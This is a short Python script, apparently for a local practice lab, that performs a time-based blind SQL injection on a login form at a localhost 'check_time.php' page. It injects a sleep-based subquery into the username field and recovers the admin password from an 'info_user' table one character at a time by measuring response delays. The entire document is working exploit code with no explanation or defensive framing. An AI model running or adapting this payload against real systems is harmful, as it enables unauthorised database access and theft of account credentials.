import requests
import string
import time 
import sys

chars = string.printable[:-11]
url='http://localhost:8080/websql/check_time.php'
pass_admin=''
i=1
s=requests.Session()
s.get(url)

while True:
	for c in chars:
		payload=f"' and (select sleep(3) from info_user where user='admin' and substr(passwd,{i},1) = '{c}')-- -"
		data = {'username': payload, 'password': '123'}
		time_1=time.time()
		r = requests.post(url, data = data)
		print(c)
		time_2=time.time()
		sum_time=time_2 - time_1
		if sum_time < 3 :
			pass
		else :
			print('okeeeeeeeeeee')
			pass_admin+=c 
			i+=1
			print(pass_admin)
			break

		if(i==6):
			print('password administrator :' + pass_admin)
			exit()

